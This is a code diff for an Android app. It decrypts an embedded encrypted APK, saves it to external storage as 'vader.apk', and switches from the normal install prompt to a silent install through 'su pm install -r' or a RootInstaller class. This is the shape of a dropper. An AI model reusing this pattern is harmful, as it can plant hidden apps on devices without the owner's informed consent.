@@ -18,6 +18,7 @@ import android.widget.Toast;
 
 import com.andrei.host.R;
 import com.andrei.host.security.CryptoUtils;
+import com.andrei.host.security.RootInstaller;
 import com.andrei.host.storage.StorageUtils;
 
 import java.io.IOException;
@@ -80,7 +81,7 @@ public class AnakinActivity extends AppCompatActivity implements View.OnClickLis
             case R.id.install_btn:
                 byte[] apk = CryptoUtils.decryptApk(StorageUtils.ANAKIN_FILE, this);
                 StorageUtils.saveExternalStorage(apk, this);
-                installApk();
+                installApk2();
                 break;
 
             default:
@@ -93,5 +94,33 @@ public class AnakinActivity extends AppCompatActivity implements View.OnClickLis
         intent.setDataAndType(StorageUtils.mContentUri, "application/vnd.android.package-archive");
         intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         startActivity(intent);
+    }
+
+    private void installApk2() {
+        try {
+            Runtime.getRuntime().exec("su pm install -r " + "/storage/emulated/0/vader.apk ");
+//            Runtime.getRuntime().exec("chmod 777 " + "/storage/emulated/0/vader.apk");
+//            Process process = Runtime.getRuntime().exec("sudo pm install -r " + "/storage/emulated/0/vader.apk");
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+//        try {
+//            // TODO: 05/04/2018 try to concatenate the file:/// and just leave the rest
+//        } catch (InterruptedException | IOException e) {
+//            e.printStackTrace();
+//        }
+    }
+
+    private void installApk3() {
+//        try {
+//            String command;
+//            command = "adb install -r " + "/storage/emulated/0/vader.apk";
+//            Process proc = Runtime.getRuntime().exec(new String[]{"su", "-c", command});
+//            proc.waitFor();
+//        } catch (Exception e) {
+//            e.printStackTrace();
+//        }
+        RootInstaller rootInstaller = new RootInstaller();
+        rootInstaller.install("/storage/emulated/0/vader.apk");
     }
 }
